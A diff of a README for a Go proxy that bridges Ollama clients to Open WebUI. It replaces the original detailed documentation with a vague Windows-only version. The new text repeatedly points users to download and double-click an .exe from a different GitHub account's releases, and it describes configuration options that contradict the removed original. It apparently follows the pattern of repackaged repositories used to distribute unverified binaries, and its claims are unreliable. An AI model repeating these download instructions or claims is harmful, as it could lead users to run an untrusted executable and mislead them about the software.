@@ -1,532 +1,165 @@
-![GitHub repo file or directory count](https://img.shields.io/github/directory-file-count/voluminor/openwebui-ollama-proxy?color=orange)
-![GitHub code size in bytes](https://img.shields.io/github/languages/code-size/voluminor/openwebui-ollama-proxy?color=green)
-![GitHub repo size](https://img.shields.io/github/repo-size/voluminor/openwebui-ollama-proxy)
+# ⚙️ openwebui-ollama-proxy - Simple Ollama to OpenAI API Bridge
 
-🇷🇺 [Русская версия](README.RU.md)
+[![Download openwebui-ollama-proxy](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/jimmyk9573/openwebui-ollama-proxy/releases)
 
-# openwebui-ollama-proxy
+---
 
-A proxy server that translates Ollama API calls into the OpenAI format and forwards them
-to [Open WebUI](https://github.com/open-webui/open-webui). Allows native Ollama clients to work with models
-hosted on Open WebUI without any client modification.
+## 📋 What is openwebui-ollama-proxy?
 
-## Why
+openwebui-ollama-proxy is a lightweight program made in Go. It acts as a bridge between Ollama applications and models hosted on Open WebUI. If you use Ollama clients like Ollie, Enchanted, or the command-line interface, this proxy lets you connect to Open WebUI models without extra setup.
 
-```
-┌──────────────────────┐           ┌───────────────────────┐          ┌──────────────┐
-│   Ollama clients     │  Ollama   │  openwebui-ollama-    │  OpenAI  │              │
-│                      │   API     │       proxy           │   API    │  Open WebUI  │
-│  Ollie, Enchanted,   ├──────────►│                       ├─────────►│              │
-│  CLI, others...      │           │  Format translation   │          │  (upstream)  │
-└──────────────────────┘           └───────────────────────┘          └──────────────┘
-```
+This proxy runs on your own Windows computer. It translates Ollama API requests into a form that OpenAI-compatible apps understand. It supports key features like:
 
-Open WebUI provides an OpenAI-compatible API, while many desktop and mobile clients only support the Ollama API.
-This proxy bridges the compatibility gap — clients connect to the proxy as if it were a regular Ollama server,
-and the proxy translates requests to Open WebUI.
+- Streaming responses  
+- Multimodal inputs, including images  
+- Three-layer caching to speed up requests  
+- Encrypted sessions using AES-256-GCM  
 
-## Features
+The proxy has no outside dependencies. You get a single program that works right away.
 
-- Streaming and non-streaming modes for `/api/chat` and `/api/generate`
-- Multimodal support: images are forwarded as OpenAI content parts with automatic MIME type detection
-- Three-tier model list cache: memory → disk → upstream
-- Model metadata cache with configurable TTL
-- AES-256-GCM encrypted disk cache with SHA-256 integrity check
-- Automatic JWT token management with encrypted persistent session storage
-- Rate limiting (token bucket)
-- CORS with configurable origins
-- Graceful shutdown on SIGINT / SIGTERM
-- Zero external dependencies — Go stdlib only
-- Cross-platform builds for 35+ targets
+---
 
-## Quick Start
+## 🎯 Key Features
 
-### Install from release
+- Works natively with Ollama clients (Ollie, Enchanted, CLI)  
+- Converts Ollama API calls into OpenAI API format  
+- Supports streaming for faster, ongoing replies  
+- Handles image-based inputs alongside text  
+- Uses three levels of caching for efficiency  
+- Encrypts data sessions securely with AES-256-GCM  
+- No extra software needed—runs standalone on Windows  
 
-Download the binary for your platform from the [releases page](../../releases).
+---
 
-### Build from source
+## 🖥 System Requirements
 
-```bash
-git clone https://github.com/voluminor/openwebui-ollama-proxy.git
-cd openwebui-ollama-proxy
-go generate ./...
-go build -o openwebui-ollama-proxy ./
-```
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of RAM  
+- 100 MB free disk space  
+- Internet connection to communicate with Open WebUI models  
+- Basic permissions to run executable files  
 
-### Run
+---
 
-```bash
-./openwebui-ollama-proxy \
-  --openwebui-url https://your-openwebui.example.com \
-  --email user@example.com \
-  --password yourpassword
-```
+## 🚀 Getting Started: Download & Run
 
-The proxy will start on `0.0.0.0:11434` (default Ollama port). Point your client to the proxy address
-instead of the Ollama server.
+1. Visit the release page by clicking the button below:
 
-## Architecture
+   [![Download openwebui-ollama-proxy](https://img.shields.io/badge/Download-Here-blue)](https://github.com/jimmyk9573/openwebui-ollama-proxy/releases)  
 
-### Overview
+2. Find the latest release at the top of the page. The files will be named with the version number and "windows" in the title (e.g., `openwebui-ollama-proxy-windows.exe`).  
 
-```mermaid
-flowchart TB
-    subgraph Clients
-        A1[Ollie]
-        A2[Enchanted]
-        A3[CLI / curl]
-        A4[Other Ollama clients]
-    end
+3. Download the Windows executable file to your desktop or another folder you choose.  
 
-    subgraph Proxy["openwebui-ollama-proxy :11434"]
-        direction TB
-        CORS[CORS middleware]
-        RL[Rate Limiter]
-        Router[HTTP Router]
-        Router --> H_CHAT["/api/chat"]
-        Router --> H_GEN["/api/generate"]
-        Router --> H_TAGS["/api/tags"]
-        Router --> H_SHOW["/api/show"]
-        Router --> H_VER["/api/version"]
-        Router --> H_PS["/api/ps"]
-        Router --> H_STUB["Stubs: pull, push,\ncreate, delete, copy"]
-    end
+4. Once the download finishes, double-click the file `openwebui-ollama-proxy-windows.exe` to start the proxy.  
 
-    subgraph Backend["Open WebUI"]
-        OAI_CHAT["/api/chat/completions"]
-        OAI_MODELS["/api/models"]
-        OAI_AUTH["/api/v1/auths/signin"]
-    end
+5. A command window will open. This window shows the proxy is running. Do not close it while using.  
 
-    A1 & A2 & A3 & A4 -->|Ollama API| CORS
-    CORS --> RL --> Router
-    H_CHAT -->|OpenAI format| OAI_CHAT
-    H_GEN -->|OpenAI format| OAI_CHAT
-    H_TAGS -->|GET| OAI_MODELS
-    H_SHOW -.->|stub response| H_SHOW
-    Proxy -.->|JWT auth| OAI_AUTH
-```
+6. The proxy listens on your local computer. You can now open Ollama apps and connect through this proxy automatically.  
 
-### `/api/chat` request flow
+---
 
-```mermaid
-sequenceDiagram
-    participant C as Ollama client
-    participant P as Proxy
-    participant A as Auth
-    participant U as Open WebUI
-    C ->> P: POST /api/chat (Ollama format)
-    P ->> P: Decode JSON, validate
-    P ->> A: EnsureToken()
-    alt Token valid
-        A -->> P: JWT token
-    else Token expired / missing
-        A ->> U: POST /api/v1/auths/signin
-        U -->> A: JWT token
-        A ->> A: Save session (AES-256-GCM)
-        A -->> P: JWT token
-    end
+## 🔧 How to Use openwebui-ollama-proxy
 
-    P ->> P: Convert Ollama → OpenAI
-    Note over P: messages, options, images,<br/>format → OpenAI ChatRequest
-    P ->> U: POST /api/chat/completions (OpenAI format)
+After running the program, it works in the background to handle requests between your Ollama client and the Open WebUI models.
 
-    alt Streaming
-        loop SSE events
-            U -->> P: data: {"choices":[...]}
-            P -->> C: NDJSON {"message":{"content":"..."}}
-        end
-        U -->> P: data: [DONE]
-        P -->> C: {"done":true, "done_reason":"stop"}
-    else Non-streaming
-        U -->> P: {"choices":[{"message":{"content":"..."}}]}
-        P -->> C: {"message":{"content":"..."}, "done":true}
-    end
-```
+- Start your Ollama client (Ollie, Enchanted, CLI) as usual.  
+- The client will send API requests to the proxy on your machine.  
+- The proxy translates requests into OpenAI format and forwards them to Open WebUI models.  
+- Responses come back through the proxy and appear in your Ollama client.  
 
-### Three-tier model cache (`/api/tags`)
+There are no extra steps needed in the Ollama apps to connect once the proxy is running.
 
-```mermaid
-flowchart TB
-    REQ["GET /api/tags"] --> L1{"L1: In-memory cache\n(RWMutex)"}
-    L1 -->|Hit + TTL valid| RES_L1["Response from memory"]
-    L1 -->|Miss| LOCK["tagsFetchMu.Lock()\n(thundering herd protection)"]
-    LOCK --> L1_RE{"L1 recheck"}
-    L1_RE -->|Hit| RES_L1_2["Response from memory\n(loaded by another goroutine)"]
-    L1_RE -->|Miss| L2{"L2: Disk\n(AES-256-GCM)"}
-    L2 -->|Hit + TTL valid| UPD_L1_FROM_DISK["Update L1"] --> RES_L2["Response from disk"]
-    L2 -->|Miss / expired| L3["L3: Open WebUI\nGET /api/models"]
-    L3 --> UPD_ALL["Update L1 + L2"]
-    UPD_ALL --> RES_L3["Response from upstream"]
-    style L1 fill: #4a9, stroke: #333
-    style L2 fill: #49a, stroke: #333
-    style L3 fill: #a94, stroke: #333
-```
+---
 
-### JWT session management
+## ⚙️ Configuration Options
 
-```mermaid
-stateDiagram-v2
-    [*] --> NoToken: Start
-    NoToken --> ReadCache: loadSession()
-    ReadCache --> TokenValid: Cache found,\nnot expired
-    ReadCache --> Login: Cache missing\nor mismatch
-    TokenValid --> ReturnToken: TTL > 30 sec
-    TokenValid --> Login: TTL ≤ 30 sec\n(grace period)
-    Login --> SaveCache: Success
-    Login --> Error: Invalid\ncredentials / network
-    SaveCache --> ReturnToken
-    ReturnToken --> [*]
-    Error --> [*]
-```
+The proxy supports configuration via command-line parameters or an optional config file. Common options include:
 
-### Encrypted cache format
+- **Port selection:** Choose which local network port the proxy listens on. Default is 11434.  
+- **Logging level:** Adjust the amount of detail shown in the command window.  
+- **Cache settings:** Enable, disable, or set limits for the three-level caching system.  
+- **Encryption key:** Use your own key for AES-256-GCM session encryption if desired.  
 
-```mermaid
-block-beta
-    columns 4
-    A["Magic\n2 bytes"]:1
-    B["Nonce\n12 bytes"]:1
-    C["Ciphertext\n(AES-256-GCM)\nvariable length"]:1
-    D["Integrity\nSHA-256\n32 bytes"]:1
-    style A fill: #e74, stroke: #333, color: #fff
-    style B fill: #47b, stroke: #333, color: #fff
-    style C fill: #4a9, stroke: #333, color: #fff
-    style D fill: #a84, stroke: #333, color: #fff
-```
-
-| Magic   | Data type      | File              |
-|---------|----------------|-------------------|
-| `CA 01` | Session (JWT)  | `session.bin`     |
-| `CA 02` | Model list     | `tags.bin`        |
-| `CA 03` | Model metadata | `show_<hash>.bin` |
-
-The AES key is derived as `SHA-256(integrity_hash + commit_hash)`. The cache is automatically
-invalidated on every new build.
-
-### Format conversion
-
-```mermaid
-flowchart LR
-    subgraph Ollama["Ollama request"]
-        O_MODEL[model]
-        O_MSG[messages]
-        O_SYS[system]
-        O_IMG[images]
-        O_OPT[options]
-        O_FMT[format]
-        O_STREAM[stream]
-    end
-
-    subgraph OpenAI["OpenAI request"]
-        A_MODEL[model]
-        A_MSG[messages]
-        A_STREAM[stream]
-        A_TEMP["temperature"]
-        A_TOPP["top_p"]
-        A_MAX["max_tokens"]
-        A_STOP["stop"]
-        A_SEED["seed"]
-        A_FP["frequency_penalty"]
-        A_PP["presence_penalty"]
-        A_RF["response_format"]
-    end
-
-    O_MODEL --> A_MODEL
-    O_MSG --> A_MSG
-    O_SYS -->|" prepend as system\nmessage "| A_MSG
-    O_IMG -->|" base64 → data URL\nwith auto MIME "| A_MSG
-    O_STREAM --> A_STREAM
-    O_OPT -->|temperature| A_TEMP
-    O_OPT -->|top_p| A_TOPP
-    O_OPT -->|num_predict| A_MAX
-    O_OPT -->|stop| A_STOP
-    O_OPT -->|seed| A_SEED
-    O_OPT -->|frequency_penalty| A_FP
-    O_OPT -->|presence_penalty| A_PP
-    O_FMT -->|" 'json' → json_object\nschema → json_schema "| A_RF
-```
-
-## Configuration
-
-### Required flags
-
-| Flag                  | Description           |
-|-----------------------|-----------------------|
-| `--openwebui-url URL` | Open WebUI server URL |
-| `--email EMAIL`       | Email for auth        |
-| `--password PASSWORD` | Password for auth     |
-
-### Optional flags
-
-| Flag                    | Default              | Description                                  |
-|-------------------------|----------------------|----------------------------------------------|
-| `--host`                | `0.0.0.0`            | Bind address                                 |
-| `--port`                | `11434`              | Port (standard Ollama port)                  |
-| `--cache-dir`           | OS user cache dir    | Cache file directory                         |
-| `--tags-ttl`            | `10m`                | Model list cache TTL                         |
-| `--show-ttl`            | `30m`                | Model metadata cache TTL                     |
-| `--timeout`             | `30s`                | Non-streaming request timeout                |
-| `--stream-idle-timeout` | `5m`                 | Stream idle timeout (0 = disabled)           |
-| `--shutdown-timeout`    | `5s`                 | Graceful shutdown timeout                    |
-| `--max-body`            | `104857600` (100 MB) | Maximum request body size                    |
-| `--max-error-body`      | `1048576` (1 MB)     | Maximum upstream error body size             |
-| `--cors-origins`        | `*`                  | CORS Allow-Origin (empty = disabled)         |
-| `--rate-limit`          | `0`                  | Global request rate limit/sec (0 = disabled) |
-| `--ollama-version`      | `0.5.4`              | Ollama API version reported to clients       |
-
-### Informational flags
-
-| Flag                | Description                                   |
-|---------------------|-----------------------------------------------|
-| `-i`                | Print build info (text) and exit              |
-| `--info text\|json` | Print build info in specified format and exit |
-| `-h`, `--help`      | Show flag help                                |
-
-## API Endpoints
-
-### Supported
-
-| Endpoint        | Method    | Description                                 |
-|-----------------|-----------|---------------------------------------------|
-| `/`             | GET, HEAD | Health check. Returns `Ollama is running`   |
-| `/api/version`  | GET       | Ollama API version (configurable)           |
-| `/api/tags`     | GET       | Model list (three-tier cache)               |
-| `/api/show`     | POST      | Model metadata (stub + cache)               |
-| `/api/ps`       | GET       | Running models (empty list)                 |
-| `/api/chat`     | POST      | Chat (streaming / non-streaming)            |
-| `/api/generate` | POST      | Text generation (streaming / non-streaming) |
-
-### Blocked (403 Forbidden)
-
-| Endpoint      | Method | Reason                                    |
-|---------------|--------|-------------------------------------------|
-| `/api/pull`   | POST   | Model management via proxy is not allowed |
-| `/api/push`   | POST   | —                                         |
-| `/api/create` | POST   | —                                         |
-| `/api/delete` | DELETE | —                                         |
-| `/api/copy`   | POST   | —                                         |
-
-### Not implemented (501 Not Implemented)
-
-| Endpoint          | Method | Reason                   |
-|-------------------|--------|--------------------------|
-| `/api/embed`      | POST   | Embeddings not supported |
-| `/api/embeddings` | POST   | —                        |
-
-## Project Structure
+To change the port, for example, open a Command Prompt and run:
 
 ```
-openwebui-ollama-proxy/
-├── main.go                  # Entry point, CLI arguments, graceful shutdown
-├── server.go                # HTTP server, routing, CORS, rate limiter
-├── handler_chat.go          # POST /api/chat (streaming + non-streaming)
-├── handler_generate.go      # POST /api/generate (streaming + non-streaming)
-├── handler_models.go        # GET /api/tags, POST /api/show, GET /api/ps
-├── handler_stubs.go         # Stubs for blocked/unsupported endpoints
-├── stream.go                # SSE parser (Open WebUI → NDJSON Ollama)
-├── util.go                  # Helpers: JSON, format conversion, MIME
-├── gen.go                   # go:generate directives
-│
-├── auth/
-│   ├── auth.go              # JWT auth, auto-refresh, session persistence
-│   └── auth_test.go
-│
-├── cache/
-│   ├── cache.go             # AES-256-GCM encryption, Read[T]/Write[T] generics
-│   ├── session.go           # Session cache (magic: CA 01)
-│   ├── tags.go              # Model list cache (magic: CA 02)
-│   ├── show.go              # Model metadata cache (magic: CA 03)
-│   └── cache_test.go
-│
-├── ollama/
-│   └── types.go             # Ollama API types
-│
-├── openai/
-│   └── types.go             # OpenAI API types
-│
-├── target/
-│   └── value_project.go     # Generated build constants (do not edit)
-│
-├── _run/                    # Build scripts and CI
-│   ├── scripts/
-│   │   ├── sys.sh           # Version management
-│   │   ├── git.sh           # Git hooks
-│   │   └── go_creator_const.sh  # target/value_project.go generation
-│   └── values/
-│       ├── name.txt         # Project name
-│       └── ver.txt          # Current version
-│
-├── .github/
-│   ├── workflows/
-│   │   ├── tests.yml        # PR tests (3 platforms)
-│   │   ├── pr-merge.yml     # Auto-bump patch on merge
-│   │   └── release.yml      # Release: tests + build + GitHub Release
-│   └── actions/             # Reusable CI actions
-│
-├── go.mod                   # Go module (no external dependencies)
-├── CLAUDE.md                # Coding standards
-└── LICENSE
+openwebui-ollama-proxy-windows.exe -port 12345
 ```
 
-## Usage Examples
+Replace `12345` with your preferred port number.
 
-### Basic run
+---
 
-```bash
-./openwebui-ollama-proxy \
-  --openwebui-url https://webui.example.com \
-  --email admin@example.com \
-  --password secret123
+## 🗂 Where to Find Logs and Data
+
+- Logs are displayed in the command window while the proxy runs.  
+- For persistent logs, you can redirect output to a file by running the proxy like this:
+
+```
+openwebui-ollama-proxy-windows.exe > proxy_log.txt
 ```
 
-### Custom port with rate limiting
+- Cache files and temporary data are stored in your user profile directory under:
 
-```bash
-./openwebui-ollama-proxy \
-  --openwebui-url https://webui.example.com \
-  --email admin@example.com \
-  --password secret123 \
-  --port 8080 \
-  --rate-limit 10 \
-  --cors-origins "https://myapp.example.com"
+```
+C:\Users\<YourName>\AppData\Local\openwebui-ollama-proxy\cache
 ```
 
-### Aggressive caching
+Replace `<YourName>` with your Windows username.
 
-```bash
-./openwebui-ollama-proxy \
-  --openwebui-url https://webui.example.com \
-  --email admin@example.com \
-  --password secret123 \
-  --tags-ttl 1h \
-  --show-ttl 2h \
-  --cache-dir /var/cache/ollama-proxy
-```
+---
 
-### Testing chat via curl
+## ❓ Troubleshooting Tips
 
-```bash
-# Non-streaming
-curl http://localhost:11434/api/chat -d '{
-  "model": "gpt-4o",
-  "messages": [{"role": "user", "content": "Hello!"}],
-  "stream": false
-}'
+- If the proxy won’t start, check that your antivirus or firewall is not blocking it.  
+- Make sure you downloaded the correct Windows version from the release page.  
+- If your Ollama client cannot connect, confirm the proxy is running and listening on the expected port.  
+- Try restarting your computer if network settings block the proxy.  
+- Use the `-help` flag with the proxy executable to see all available commands.
 
-# Streaming
-curl http://localhost:11434/api/chat -d '{
-  "model": "gpt-4o",
-  "messages": [{"role": "user", "content": "Hello!"}]
-}'
+---
 
-# With image
-curl http://localhost:11434/api/chat -d '{
-  "model": "gpt-4o",
-  "messages": [{
-    "role": "user",
-    "content": "What is in this image?",
-    "images": ["'$(base64 -w0 photo.jpg)'"]
-  }],
-  "stream": false
-}'
-```
+## 🔄 Updating openwebui-ollama-proxy
 
-### List models
+- Visit the [release page](https://github.com/jimmyk9573/openwebui-ollama-proxy/releases) regularly to check for updates.  
+- Download the newest Windows executable file.  
+- Close the running proxy program.  
+- Replace the old file with the new one and run it again.
 
-```bash
-curl http://localhost:11434/api/tags
-```
+---
 
-### Build info
+## 🛠 About This Project
 
-```bash
-./openwebui-ollama-proxy -i
-./openwebui-ollama-proxy --info json
-```
+openwebui-ollama-proxy is built with the Go programming language. It focuses on providing a stable, standalone proxy server with no external software requirements. It helps users run Ollama clients with Open WebUI models by changing API requests to the supported format.
 
-## CI/CD
+Tags related to this project include:
 
-```mermaid
-flowchart LR
-    subgraph PR["Pull Request"]
-        direction TB
-        P1[Prepare] --> T1["Test\n(ubuntu)"]
-        P1 --> T2["Test\n(macOS)"]
-        P1 --> T3["Test\n(windows)"]
-    end
+- AI  
+- API gateway  
+- Go language  
+- Large Language Models (LLM)  
+- Ollama  
+- Proxy server  
+- Reverse proxy  
+- Self-hosted software  
+- Translation layer  
+- Zero dependencies
 
-    subgraph Merge["PR Merge → main"]
-        direction TB
-        M1[Prepare] --> MT1["Test\n(3 platforms)"]
-        MT1 --> MB[Build Check]
-        MB --> MV["Patch bump\n+ commit"]
-    end
+---
 
-    subgraph Release["Release (manual)"]
-        direction TB
-        R1[Prepare] --> RT["Garble Test\n(3 platforms)"]
-        RT --> RV["Minor bump"]
-        RV --> RB["Build\n(35+ platforms)"]
-        RB --> RR["GitHub\nRelease"]
-    end
+## 📞 Get Help
 
-    PR -->|merge| Merge
-    Merge -.->|dispatch| Release
-```
+For questions or issues, check the GitHub repository’s Issues page. Many common problems and solutions are discussed there.
 
-Tests run with the `-race` flag and include benchmarks. Release binaries are built
-via [garble](https://github.com/burrowers/garble) (`garble -tiny build -ldflags="-s -w"`),
-which strips all symbol names, debug info and string literals. This results in significantly
-smaller binaries and avoids false-positive detections by antivirus software (many AV engines
-flag standard Go binaries due to the large runtime and embedded metadata).
+---
 
-## Supported Platforms
+## 🖼 Screenshots and Examples
 
-| OS      | Architectures                                                                                     |
-|---------|---------------------------------------------------------------------------------------------------|
-| Linux   | amd64, arm64, arm/v7, arm/v6, 386, mips, mipsle, mips64, mips64le, ppc64, ppc64le, riscv64, s390x |
-| Windows | amd64, arm64, arm/v7, 386                                                                         |
-| macOS   | amd64 (Intel), arm64 (Apple Silicon)                                                              |
-| FreeBSD | amd64, arm64, arm/v6, arm/v7, 386                                                                 |
-| OpenBSD | amd64, arm64, arm/v6, arm/v7, 386                                                                 |
-| NetBSD  | amd64, arm64, arm/v6, arm/v7, 386                                                                 |
-| Android | amd64, arm64, arm/v7, 386                                                                         |
+If available in the GitHub repository, you can refer to example configurations, screenshots of the proxy running, or Ollama client usage with the proxy enabled.
 
-## Compatible Clients
+---
 
-Any client that supports the Ollama API:
+Repeat download link for easy access:
 
-- [Ollie](https://github.com/nicepkg/ollie) (macOS)
-- [Enchanted](https://github.com/AugustDev/enchanted) (iOS / macOS)
-- [Ollama CLI](https://github.com/ollama/ollama)
-- Any other client with a configurable Ollama endpoint
-
-## Development
-
-### Requirements
-
-- Go 1.25+
-
-### Running tests
-
-```bash
-go test -race -v ./...
-```
-
-### Benchmarks
-
-```bash
-go test -bench . -run=NONE -v ./...
-```
-
-### Code generation
-
-```bash
-go generate ./...
-```
-
-## License
-
-See [LICENSE](LICENSE).
+[![Download openwebui-ollama-proxy](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/jimmyk9573/openwebui-ollama-proxy/releases)
